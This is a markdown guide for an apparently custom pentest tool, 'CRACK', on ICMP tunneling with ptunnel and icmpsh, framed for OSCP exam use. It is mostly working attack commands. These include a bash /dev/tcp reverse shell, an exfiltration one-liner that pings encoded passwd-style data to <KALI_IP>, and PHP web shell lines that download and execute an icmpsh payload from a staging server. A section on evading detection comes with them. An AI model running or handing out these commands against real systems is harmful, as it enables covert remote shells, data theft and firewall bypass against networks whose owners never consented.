# ICMP Tunnel Setup Guide

## Overview

ICMP tunneling enables covert communication using ICMP echo/reply packets (ping), bypassing firewalls that only allow ICMP traffic. CRACK integrates **ptunnel** and **icmpsh** for ICMP-based port forwarding and interactive shells.

## Use Cases

### OSCP Exam Scenarios
- Firewall only allows ICMP outbound (ping)
- Exfiltrate data via ICMP payloads
- Establish reverse shell through ICMP tunnel
- Pivot through ICMP-only network segments
- Bypass strict egress filtering when DNS is also blocked

## Tools

### Ptunnel (TCP-over-ICMP)
- Forwards TCP traffic through ICMP echo/reply
- Acts as proxy: localhost:8000 → remote:80 via ICMP
- Supports any TCP protocol (SSH, HTTP, MySQL, etc.)
- Password-protected tunnel

### Icmpsh (Shell-over-ICMP)
- Interactive shell directly over ICMP
- Simple master/slave architecture
- No TCP tunneling (direct shell only)
- Windows client available (icmpsh.exe)

---

## Prerequisites

### Attacker Machine (Kali Linux)

#### Install Tools
```bash
# Ptunnel
sudo apt-get update
sudo apt-get install ptunnel -y

# Icmpsh (Python-based)
git clone https://github.com/bdamele/icmpsh.git /opt/icmpsh
chmod +x /opt/icmpsh/icmpsh_m.py
```

#### Disable Kernel ICMP Replies (Required for icmpsh)
```bash
# Disable (required for icmpsh to work)
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Verify
sysctl net.ipv4.icmp_echo_ignore_all
# Should output: net.ipv4.icmp_echo_ignore_all = 1

# Re-enable when done
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

**Why?** Kernel automatically responds to ICMP echo requests. Icmpsh needs to handle these itself, so kernel replies must be disabled.

### Victim Machine

#### Linux Client
```bash
# Ptunnel
apt-get install ptunnel  # Debian/Ubuntu
yum install ptunnel      # RHEL/CentOS
```

#### Windows Client
- **Ptunnel**: No official Windows client (use icmpsh instead)
- **Icmpsh**: Pre-compiled Windows executable
  ```
  https://github.com/bdamele/icmpsh/raw/master/icmpsh.exe
  ```

---

## Usage: Ptunnel (TCP-over-ICMP)

### Step 1: Start Ptunnel Server (Kali)
```bash
# Basic usage
sudo crack session icmp-start

# With custom password
sudo crack session icmp-start --password secret123

# Specify expected target IP (optional)
sudo crack session icmp-start --target 192.168.45.150
```

**Output:**
```
[+] Ptunnel ICMP tunnel started
[+] Password: secret123

[+] Client command (example):
    ptunnel -p <server_ip> -lp 8000 -da <dest_ip> -dp 80 -x secret123

[*] This tunnels localhost:8000 -> dest_ip:80 via ICMP

[*] Listener running. Press Ctrl+C to stop.
```

### Step 2: Connect Client (Victim)

#### Scenario: Tunnel HTTP traffic to internal web server

```bash
# On victim machine
# Tunnel localhost:8000 -> 192.168.1.10:80 via ICMP to Kali
sudo ptunnel -p <KALI_IP> -lp 8000 -da 192.168.1.10 -dp 80 -x secret123

# Flags:
#   -p: Proxy (ptunnel server IP)
#   -lp: Local port to bind
#   -da: Destination address (target to reach)
#   -dp: Destination port
#   -x: Password
```

**Client output:**
```
[inf]: Starting ptunnel v0.72.
[inf]: Tunneling TCP traffic from port 8000 to 192.168.1.10:80
[inf]: Relaying through ptunnel proxy at <KALI_IP>
```

### Step 3: Access Tunneled Service
```bash
# From victim machine
curl http://localhost:8000
# Traffic goes: localhost:8000 -> ptunnel -> ICMP -> Kali -> 192.168.1.10:80

# Or use browser
firefox http://localhost:8000
```

### Step 4: Tunnel Reverse Shell

```bash
# On Kali (start listener)
nc -nlvp 4444

# On victim (tunnel reverse shell)
# Step 1: Start ptunnel to forward localhost:8000 -> Kali:4444
sudo ptunnel -p <KALI_IP> -lp 8000 -da <KALI_IP> -dp 4444 -x secret123 &

# Step 2: Connect reverse shell to localhost:8000
bash -i >& /dev/tcp/127.0.0.1/8000 0>&1
```

---

## Usage: Icmpsh (Shell-over-ICMP)

### Step 1: Start Icmpsh Server (Kali)
```bash
# Disable kernel ICMP replies (CRITICAL!)
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Start icmpsh listener
sudo crack session icmp-start --tool icmpsh

# Or manual:
sudo python /opt/icmpsh/icmpsh_m.py 0.0.0.0 0.0.0.0
```

**Output:**
```
[+] Icmpsh ICMP shell started
[+] WARNING: Kernel ICMP replies disabled

[+] Client command:
    icmpsh.exe -t <server_ip>

[*] Listener running. Press Ctrl+C to stop.
```

### Step 2: Connect Client (Victim)

#### Windows Client
```powershell
# Download icmpsh.exe
Invoke-WebRequest -Uri "https://github.com/bdamele/icmpsh/raw/master/icmpsh.exe" -OutFile icmpsh.exe

# Connect
.\icmpsh.exe -t <KALI_IP>
```

#### Linux Client (Compile Required)
```bash
# On victim (if compilation available)
git clone https://github.com/bdamele/icmpsh.git
cd icmpsh
gcc icmpsh.c -o icmpsh

# Connect
sudo ./icmpsh -t <KALI_IP>
```

### Step 3: Interact with Shell
```bash
# On Kali (icmpsh console)
Microsoft Windows [Version 10.0.19041]
C:\Users\victim>

# Run commands
whoami
hostname
ipconfig
```

### Step 4: Cleanup (When Done)
```bash
# Re-enable kernel ICMP replies
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

---

## Performance Considerations

### Bandwidth
- ICMP payload: **~64 bytes per packet** (standard ping)
- Can be increased up to ~1400 bytes
- Typical throughput: **1-5 KB/s** (extremely slow!)

### Latency
- Each command requires ICMP echo/reply round-trip
- Expect **500ms - 3s per command**
- Interactive shells will be very sluggish

### Packet Loss
- ICMP often deprioritized by routers
- Expect **5-20% packet loss**
- Ptunnel handles retransmissions automatically

---

## Troubleshooting

### Ptunnel: "No route to host"
**Problem:** Victim can't reach Kali via ICMP

**Test connectivity:**
```bash
# On victim
ping <KALI_IP>
# If this fails, ICMP is blocked
```

**Solution:** Check firewall rules
```bash
# On Kali (allow ICMP)
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
sudo iptables -A OUTPUT -p icmp --icmp-type echo-reply -j ACCEPT
```

### Icmpsh: Shell output garbled
**Problem:** Kernel ICMP replies interfering

**Verify ICMP disabled:**
```bash
sysctl net.ipv4.icmp_echo_ignore_all
# Must output: net.ipv4.icmp_echo_ignore_all = 1
```

**Solution:** Disable if not already
```bash
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
```

### Ptunnel: Connection timeout
**Problem:** Slow network or high packet loss

**Solution:** Increase timeouts
```bash
# Client side: Increase timeout
ptunnel -p <KALI_IP> -lp 8000 -da <dest> -dp 80 -x password --max-tunnels 1
```

### "Permission denied" when starting
**Problem:** Raw sockets require root

**Solution:** Always use sudo
```bash
sudo crack session icmp-start
```

---

## Detection Evasion

### Blend with Normal Ping Traffic
```bash
# Ptunnel: Mimic standard ping size
ptunnel -p <KALI_IP> -lp 8000 -da <dest> -dp 80 -x pass -m 64
# -m 64: Standard ping payload size
```

### Slow Down Packet Rate
```bash
# Rate limiting (manual ptunnel invocation)
# Add delays between commands in icmpsh
```

### Blue Team Detection Indicators
- **Abnormally large ICMP packets** (>64 bytes payload)
- **High ICMP echo request volume** from single host
- **ICMP packets with non-standard payloads**
- **Unusual ICMP traffic patterns** (consistent intervals)

---

## OSCP Exam Tips

### When to Use ICMP Tunneling
- Firewall only allows ICMP (ping)
- DNS is also blocked (otherwise use DNS tunnel)
- Web shell can't execute reverse shell
- Quick command execution needed

### Manual Alternative (No Tools)
```bash
# Simple ICMP exfiltration (no tunnel)
# On victim, send data in ICMP payload
ping -c 1 -p $(echo "root:x:0" | xxd -p) <KALI_IP>

# On Kali, capture with tcpdump
sudo tcpdump -i eth0 icmp -X
```

### Time Management
- ICMP tunnel setup: **5-10 minutes**
- Connection establishment: **1-2 minutes**
- **Total: 10-15 minutes** (faster than DNS tunnel!)

### Ptunnel vs Icmpsh Decision Tree
```
Q: Need full TCP tunnel (SSH, HTTP, etc.)?
├─ YES: Use ptunnel
└─ NO: Need just shell?
    ├─ YES: Use icmpsh (simpler)
    └─ NO: Manual ICMP exfiltration
```

### Alternatives if ICMP Fails
1. DNS tunnel (iodine, dnscat2)
2. HTTP tunnel (reGeorg, chisel)
3. File-based exfiltration (FTP, SCP)

---

## Command Reference

### Ptunnel Server (Kali)
```bash
# Basic
sudo ptunnel -x password

# Verbose logging
sudo ptunnel -x password -v 4
```

### Ptunnel Client (Victim)
```bash
# Basic
sudo ptunnel -p <SERVER_IP> -lp <LOCAL_PORT> -da <DEST_IP> -dp <DEST_PORT> -x password

# Example: Tunnel to internal SSH
sudo ptunnel -p 192.168.45.200 -lp 2222 -da 192.168.1.10 -dp 22 -x pass
ssh -p 2222 user@localhost  # Connects to 192.168.1.10:22 via ICMP
```

### Icmpsh Server (Kali)
```bash
# Disable kernel ICMP replies
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1

# Start listener
sudo python /opt/icmpsh/icmpsh_m.py <ATTACKER_IP> <VICTIM_IP>
# Use 0.0.0.0 for both to accept any client
```

### Icmpsh Client (Victim - Windows)
```cmd
icmpsh.exe -t <ATTACKER_IP>
```

### Icmpsh Client (Victim - Linux)
```bash
sudo ./icmpsh -t <ATTACKER_IP>
```

---

## Example Attack Chain

### Scenario: Web Shell to Full Shell via ICMP

**Step 1:** Discover firewall allows ICMP only
```bash
# Test egress filtering from web shell
<?php system("curl http://example.com:80"); ?>   # FAILS
<?php system("curl http://example.com:443"); ?>  # FAILS
<?php system("dig google.com"); ?>               # FAILS
<?php system("ping -c 1 8.8.8.8"); ?>            # SUCCESS!
```

**Step 2:** Start ICMP tunnel server
```bash
# Icmpsh (simpler for shell)
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1
sudo crack session icmp-start --tool icmpsh
```

**Step 3:** Upload icmpsh client to victim (via web shell)
```bash
<?php
file_put_contents("/tmp/icmpsh.exe", file_get_contents("http://<staging_server>/icmpsh.exe"));
?>
```

**Step 4:** Execute icmpsh client (via web shell)
```bash
<?php system("C:\\Windows\\Temp\\icmpsh.exe -t <KALI_IP> &"); ?>
```

**Step 5:** Interact with shell (on Kali)
```bash
# Icmpsh console
C:\inetpub\wwwroot> whoami
nt authority\system

C:\inetpub\wwwroot> cd C:\Users\Administrator
C:\Users\Administrator> type flag.txt
```

**Step 6:** Cleanup
```bash
# On Kali (when done)
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=0
```

---

## Advanced: Pivoting with Ptunnel

### Scenario: Access Internal MySQL via ICMP Tunnel

```bash
# Step 1: Start ptunnel server on Kali
sudo crack session icmp-start --password exam123

# Step 2: On compromised DMZ host (victim)
# Tunnel localhost:3306 -> internal MySQL (192.168.1.10:3306)
sudo ptunnel -p <KALI_IP> -lp 3306 -da 192.168.1.10 -dp 3306 -x exam123 &

# Step 3: On Kali, access MySQL
mysql -h <VICTIM_IP> -P 3306 -u root -p
# Traffic: Kali -> ICMP -> Victim:3306 -> 192.168.1.10:3306

# Alternative: Add tunnel on victim side
# Step 2b: On victim (forward to itself first)
sudo ptunnel -p <KALI_IP> -lp 13306 -da <KALI_IP> -dp 3306 -x exam123 &

# Step 3b: On Kali (bind local port that forwards back)
sudo ptunnel -p <VICTIM_IP> -lp 3306 -da 192.168.1.10 -dp 3306 -x exam123
mysql -h 127.0.0.1 -P 3306 -u root -p
```

---

## Comparison: DNS vs ICMP Tunneling

| Feature | DNS Tunnel | ICMP Tunnel |
|---------|------------|-------------|
| **Bandwidth** | 1-10 KB/s | 1-5 KB/s |
| **Latency** | 500ms-2s | 500ms-3s |
| **Setup Time** | 30-60 min | 10-15 min |
| **Requirements** | Domain with NS record | Root access only |
| **Detection Risk** | Medium | High |
| **Use Case** | Long-term C2 | Quick shell |
| **OSCP Viability** | High (if time allows) | Very High |

---

## References

- **Ptunnel Documentation:** http://www.cs.uit.no/~daniels/PingTunnel/
- **Ptunnel GitHub:** https://github.com/DhavalKapil/icmptunnel
- **Icmpsh GitHub:** https://github.com/bdamele/icmpsh
- **ICMP Tunneling Overview:** https://www.sans.org/reading-room/whitepapers/covert/detecting-covert-channels-network-firewalls-653

## Next Steps

After establishing ICMP tunnel:
1. Use `crack session list` to view active tunnels
2. Upgrade to full interactive shell (if using ptunnel)
3. Enumerate target via tunnel
4. Use tunnel for pivoting to internal networks
5. Remember to re-enable kernel ICMP replies when done!
